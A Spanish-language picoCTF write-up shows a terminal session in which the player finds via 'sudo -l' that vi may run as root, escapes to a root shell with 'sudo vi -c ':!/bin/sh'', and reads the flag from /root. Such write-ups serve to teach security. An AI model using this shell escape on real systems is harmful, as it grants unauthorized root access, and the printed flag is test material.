Descripción
¿Puedes leer archivos en el archivo raíz?

Los detalles adicionales estarán disponibles después de lanzar su instancia de desafío.

Hints:
1.⁠ ⁠¿Qué permisos tienes?

Solución 1

Con web shell

Sepulveda24-picoctf@webshell:~$ ssh -p 65358 picoplayer@saturn.picoctf.net
The authenticity of host '[saturn.picoctf.net]:65358 ([13.59.203.175]:65358)' can't be established.
ED25519 key fingerprint is SHA256:HKm/Bw1C+mhj23vO8tXULrgLFYvzP6gQH2IwgUiQTok.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:12: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? 
Host key verification failed.
Sepulveda24-picoctf@webshell:~$ ssh -p 65358 picoplayer@saturn.picoctf.net
The authenticity of host '[saturn.picoctf.net]:65358 ([13.59.203.175]:65358)' can't be established.
ED25519 key fingerprint is SHA256:HKm/Bw1C+mhj23vO8tXULrgLFYvzP6gQH2IwgUiQTok.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:12: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[saturn.picoctf.net]:65358' (ED25519) to the list of known hosts.
picoplayer@saturn.picoctf.net's password: 
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 6.5.0-1023-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

picoplayer@challenge:~$ cd /
picoplayer@challenge:/$ ls
bin  boot  challenge  dev  etc  home  lib  lib32  lib64  libx32  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
picoplayer@challenge:/$ cd root
-bash: cd: root: Permission denied
picoplayer@challenge:/$ cd challenge
-bash: cd: challenge: Permission denied
picoplayer@challenge:/$ cd root
-bash: cd: root: Permission denied
picoplayer@challenge:/$ sudo -l
[sudo] password for picoplayer: 
Matching Defaults entries for picoplayer on challenge:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User picoplayer may run the following commands on challenge:
    (ALL) /usr/bin/vi
picoplayer@challenge:/$ sudo vi -c ':!/bin/sh' /dev/null

# cd root
# ls
# ls -al
total 12
drwx------ 1 root root   23 Aug  4  2023 .
drwxr-xr-x 1 root root   51 Feb 20 22:09 ..
-rw-r--r-- 1 root root 3106 Dec  5  2019 .bashrc
-rw-r--r-- 1 root root   35 Aug  4  2023 .flag.txt
-rw-r--r-- 1 root root  161 Dec  5  2019 .profile
# cat .flag.txt
picoCTF{uS1ng_v1m_3dit0r_1cee9dcb}
# Connection to saturn.picoctf.net closed by remote host.
Connection to saturn.picoctf.net closed.
Sepulveda24-picoctf@webshell:~$ 



Notas adicionales

-------------

Referencias

https://webshell.picoctf.org